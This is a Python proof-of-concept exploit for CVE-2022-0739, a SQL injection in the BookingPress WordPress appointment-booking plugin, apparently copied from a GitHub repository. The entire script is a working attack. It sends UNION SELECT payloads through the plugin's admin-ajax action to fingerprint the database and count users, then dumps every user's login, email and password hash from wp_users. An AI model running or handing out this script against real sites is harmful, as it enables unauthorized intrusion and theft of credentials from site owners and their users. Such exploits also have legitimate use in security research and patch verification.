#!/usr/bin/env python3

"""
Source: https://github.com/destr4ct/CVE-2022-0739
Description: WP-Plugin "bookingpress-appointment-booking" SQLi CVE-2022-0739

Usage: python3 script.py -u [URL] -n [WP-NONCE]
"""

import requests
from json import loads
from random import randint
from argparse import ArgumentParser

p = ArgumentParser()
p.add_argument('-u', '--url', dest='url', help='URL of wordpress server with vulnerable plugin (http://example.domain)', required=True)
p.add_argument('-n', '--nonce', dest='nonce', help='Nonce that you got as unauthenticated user', required=True)

trigger = ") UNION ALL SELECT @@VERSION,2,3,4,5,6,7,count(*),9 from wp_users-- -"
gainer = ') UNION ALL SELECT user_login,user_email,user_pass,NULL,NULL,NULL,NULL,NULL,NULL from wp_users limit 1 offset {off}-- -'

# Payload: ) AND ... -- - total(9)
def gen_payload(nonce, sqli_postfix, category_id=1):
    return { 
        'action': 'bookingpress_front_get_category_services', # vulnerable action,
        '_wpnonce': nonce,
        'category_id': category_id,
        'total_service': f'{randint(100, 10000)}{sqli_postfix}'
    }

if __name__ == '__main__':  
    print('- BookingPress PoC')
    i = 0
    args = p.parse_args()
    url, nonce = args.url, args.nonce
    pool = requests.session()


    # Check if target is vulnerable
    v_url = f'{url}/wp-admin/admin-ajax.php'
    proof_payload = gen_payload(nonce, trigger)
    print(proof_payload)
    
    res = pool.post(v_url, data=proof_payload)
    print(res.text)
    try:
        res = list(loads(res.text)[0].values())
    except Exception as e:
        print('-- Got junk... Plugin not vulnerable or nonce is incorrect')
        exit(-1)
    cnt = int(res[7])
    
    # Capture hashes
    print('-- Got db fingerprint: ', res[0])
    print('-- Count of users: ', cnt)
    for i in range(cnt):
        try:
            # Generate payload
            user_payload = gen_payload(nonce, gainer.format(off=i))
            u_data = list(loads(pool.post(v_url, user_payload).text)[0].values())
            print(f'|{u_data[0]}|{u_data[1]}|{u_data[2]}|')
        except: continue 
